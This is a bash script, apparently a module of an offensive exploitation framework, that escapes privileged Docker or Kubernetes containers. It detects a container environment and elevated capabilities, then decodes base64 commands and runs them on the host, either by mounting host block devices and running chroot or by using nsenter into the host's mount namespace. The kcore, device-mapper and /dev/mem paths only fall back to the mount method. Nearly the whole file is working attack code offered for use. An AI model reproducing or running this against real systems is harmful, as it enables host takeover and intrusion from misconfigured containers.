#!/bin/bash
# Privileged Container Escape Module
# Usage: --vuln privileged_container --<payload_key> [options]

set -euo pipefail

# Module variables
HOST_MOUNT="/mnt/host_escape"
ESCAPE_METHODS=("mount" "kcore" "devmem" "dmap" "module")

# Check if container is vulnerable
check_vulnerable() {
    info "[*] Checking container privileges..."
    
    # Check if we're in a container
    if [ ! -f /.dockerenv ] && [ ! -f /run/.containerenv ]; then
        if ! grep -q docker /proc/1/cgroup 2>/dev/null && ! grep -q kubepods /proc/1/cgroup 2>/dev/null; then
            warning "[!] This doesn't appear to be a container environment"
            return 1
        fi
    fi

    # Check privileged access - try multiple methods
    if [ ! -w /dev ] && [ ! -w /dev/sda1 ] 2>/dev/null; then
        error "[!] Container doesn't seem to be privileged (no write access to /dev)"
        return 1
    fi

    # Check capabilities
    if command -v capsh >/dev/null 2>&1; then
        if capsh --print 2>/dev/null | grep -q "Current: =.*cap_sys_admin"; then
            success "[+] Container has CAP_SYS_ADMIN capability"
        else
            warning "[!] CAP_SYS_ADMIN not found"
        fi
    else
        # Fallback check
        if [ -w /dev/sda1 ] 2>/dev/null || [ -w /dev/sda ] 2>/dev/null; then
            success "[+] Write access to block devices detected"
        fi
    fi

    success "[+] Container appears to be privileged and vulnerable"
    return 0
}

# Base64 decode function (required by backend)
b64_decode() {
    local b64="$1"
    printf "%s" "$b64" | base64 --decode 2>/dev/null || printf "%s" "$b64" | base64 -d 2>/dev/null
}

# Main execution function
utility-exec-function() {
    local encoded_cmd="$1"
    local command
    local output=""
    local exit_code=0

    # Decode the command
    command=$(b64_decode "$encoded_cmd")
    if [ -z "$command" ]; then
        error "[!] Failed to decode base64 command"
        return 1
    fi

    info "[*] Decoded command: $command"
    info "[*] Attempting container escape via privileged container..."

    # Ensure cleanup on exit
    trap cleanup EXIT INT TERM

    # Try different escape methods in order of reliability
    output=$(mount_escape "$command") && {
        success "[+] Command executed via mount escape"
        printf "%s" "$output"
        return 0
    }

    output=$(nsenter_escape "$command") && {
        success "[+] Command executed via nsenter"
        printf "%s" "$output"
        return 0
    }

    output=$(proc_kcore_escape "$command") && {
        success "[+] Command executed via /proc/kcore"
        printf "%s" "$output"
        return 0
    }

    output=$(device_mapper_escape "$command") && {
        success "[+] Command executed via device mapper"
        printf "%s" "$output"
        return 0
    }

    output=$(dev_mem_escape "$command") && {
        success "[+] Command executed via /dev/mem"
        printf "%s" "$output"
        return 0
    }

    error "[!] All escape methods failed"
    return 1
}

# Method 1: Mount host filesystem (most reliable)
mount_escape() {
    local command="$1"
    local output=""
    
    info "[*] Attempting mount escape..."
    
    # Create unique mount point
    HOST_MOUNT="/mnt/host_$(date +%s)"
    mkdir -p "$HOST_MOUNT" 2>/dev/null || {
        error "[!] Failed to create mount point"
        return 1
    }

    # Try different block devices in order of likelihood
    local devices=("sda1" "sda2" "sda3" "xvda1" "xvda2" "vda1" "vda2" "nvme0n1p1" "nvme0n1p2" "dm-0" "sdb1" "sdc1")
    
    for device in "${devices[@]}"; do
        if [ -b "/dev/$device" ]; then
            info "[*] Trying device: /dev/$device"
            
            # Try different filesystems
            for fs in "ext4" "ext3" "xfs" "btrfs" ""; do
                local mount_opts=""
                [ -n "$fs" ] && mount_opts="-t $fs"
                
                if mount $mount_opts "/dev/$device" "$HOST_MOUNT" 2>/dev/null; then
                    success "[+] Successfully mounted /dev/$device"
                    
                    # Check if we can execute commands in chroot
                    if [ -x "$HOST_MOUNT/bin/sh" ]; then
                        output=$(chroot "$HOST_MOUNT" /bin/sh -c "$command" 2>&1)
                    elif [ -x "$HOST_MOUNT/bin/bash" ]; then
                        output=$(chroot "$HOST_MOUNT" /bin/bash -c "$command" 2>&1)
                    else
                        # Try to find any shell
                        local shell_path=$(find "$HOST_MOUNT" -name "sh" -executable 2>/dev/null | head -1)
                        if [ -n "$shell_path" ]; then
                            output=$(chroot "$HOST_MOUNT" "$shell_path" -c "$command" 2>&1)
                        else
                            output="No shell found in chroot"
                        fi
                    fi
                    
                    local ret=$?
                    
                    # Cleanup
                    umount "$HOST_MOUNT" 2>/dev/null || true
                    rmdir "$HOST_MOUNT" 2>/dev/null || true
                    
                    if [ $ret -eq 0 ] || [ -n "$output" ]; then
                        printf "%s" "$output"
                        return 0
                    else
                        warning "[!] Command execution failed, but mount was successful"
                        printf "%s" "$output"
                        return $ret
                    fi
                fi
            done
        fi
    done
    
    # Cleanup on failure
    rmdir "$HOST_MOUNT" 2>/dev/null || true
    return 1
}

# Method 2: nsenter escape (alternative method)
nsenter_escape() {
    local command="$1"
    
    info "[*] Attempting nsenter escape..."
    
    if command -v nsenter >/dev/null 2>&1; then
        # Try to enter host namespace via proc
        if [ -d /proc/1/root ]; then
            output=$(nsenter --mount=/proc/1/ns/mnt -- /bin/sh -c "$command" 2>&1)
            local ret=$?
            if [ $ret -eq 0 ]; then
                success "[+] nsenter escape successful"
                printf "%s" "$output"
                return 0
            fi
        fi
    fi
    
    return 1
}

# Method 3: /proc/kcore access
proc_kcore_escape() {
    local command="$1"
    
    info "[*] Attempting /proc/kcore escape..."
    
    if [ -r /proc/kcore ]; then
        success "[+] /proc/kcore is readable"
        info "[*] Kernel memory access confirmed"
        
        # Try to use this access to execute commands
        # This is complex, so we'll fall back to mount method
        output=$(mount_escape "$command") && {
            printf "%s" "$output"
            return 0
        }
    fi
    
    return 1
}

# Method 4: Device mapper escape
device_mapper_escape() {
    local command="$1"
    
    info "[*] Attempting device mapper escape..."
    
    if command -v dmsetup >/dev/null 2>&1; then
        if dmsetup version >/dev/null 2>&1; then
            success "[+] dmsetup available"
            
            # Use mount method as fallback since device mapper exploitation is complex
            output=$(mount_escape "$command") && {
                printf "%s" "$output"
                return 0
            }
        fi
    fi
    
    return 1
}

# Method 5: /dev/mem access
dev_mem_escape() {
    local command="$1"
    
    info "[*] Attempting /dev/mem escape..."
    
    if [ -c /dev/mem ]; then
        if dd if=/dev/mem bs=1 count=1 2>/dev/null >/dev/null; then
            success "[+] /dev/mem is readable"
            info "[*] Physical memory access confirmed"
            
            # Fall back to mount method since /dev/mem exploitation is complex
            output=$(mount_escape "$command") && {
                printf "%s" "$output"
                return 0
            }
        fi
    fi
    
    return 1
}

# Method 6: Kernel module loading (demonstration only)
kernel_module_escape() {
    local command="$1"
    
    info "[*] Checking kernel module capabilities..."
    
    if command -v capsh >/dev/null 2>&1; then
        if capsh --print 2>/dev/null | grep -q "cap_sys_module"; then
            success "[+] CAP_SYS_MODULE available - can load kernel modules"
            warning "[!] Kernel module loading not implemented for safety"
        fi
    fi
    
    return 1
}

# Cleanup function
cleanup() {
    info "[*] Cleaning up..."
    
    # Unmount host filesystem if mounted
    if mountpoint -q "$HOST_MOUNT" 2>/dev/null; then
        umount "$HOST_MOUNT" 2>/dev/null || true
    fi
    
    # Remove mount point
    rm -rf "$HOST_MOUNT" 2>/dev/null || true
}

# Module info
module_info() {
    echo "Privileged Container Escape Module"
    echo "Escape containers running with --privileged flag"
    echo "Supported methods: ${ESCAPE_METHODS[*]}"
}

# Export functions if needed
export -f utility-exec-function
export -f check_vulnerable
export -f b64_decode